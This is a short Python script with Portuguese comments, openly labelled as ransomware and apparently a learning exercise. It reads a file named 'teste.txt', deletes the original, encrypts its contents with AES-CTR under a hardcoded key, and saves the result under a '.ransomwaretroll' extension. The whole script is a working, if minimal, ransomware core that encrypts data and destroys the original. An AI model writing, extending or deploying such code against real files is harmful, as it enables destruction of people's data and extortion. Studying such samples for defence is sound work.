import os 
import pyaes 

##abrindo o arquivo

file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

##removando o arquivo original 
os.remove(file_name)


##criando a chava de criptografia 
key = b"novomundoalo1234"
aes = pyaes.AESModeOfOperationCTR(key)

##criptografando 
crypto_data = aes.encrypt(file_data)

##salvando o arquivo criptografado

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
